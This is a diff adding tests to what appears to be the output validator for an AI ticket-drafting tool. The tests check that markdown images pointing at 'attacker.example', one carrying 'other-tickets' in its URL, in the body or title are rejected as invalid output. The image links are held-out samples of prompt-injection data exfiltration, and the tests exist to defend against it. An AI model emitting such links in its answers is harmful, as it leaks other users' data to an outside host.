@@ -529,6 +529,25 @@ See the [guide](\/tickets\/abc) first.`,
     });
   });
 
+  it("an injected remote image in the body gives FAILED INVALID_OUTPUT, never a DRAFT (K54)", async () => {
+    await expectInvalidOutput({
+      ...validOutput(),
+      bodyMarkdown:
+        "## Steps\n\nRestart the spooler.\n\n![](https://attacker.example/p.png?d=other-tickets)",
+    });
+  });
+
+  it("a protocol-relative image in the body and an image in the title give FAILED INVALID_OUTPUT (K54)", async () => {
+    await expectInvalidOutput({
+      ...validOutput(),
+      bodyMarkdown: "## Steps\n\n![x](//attacker.example/p.png)",
+    });
+    await expectInvalidOutput({
+      ...validOutput(),
+      title: "Printer fix ![x](https://attacker.example/p.png)",
+    });
+  });
+
   it("a citation of T3 for two sources gives FAILED INVALID_OUTPUT with one audit row", async () => {
     await expectInvalidOutput(
       { ...validOutput(), citations: [{ source: "T3", section: "Steps" }] },
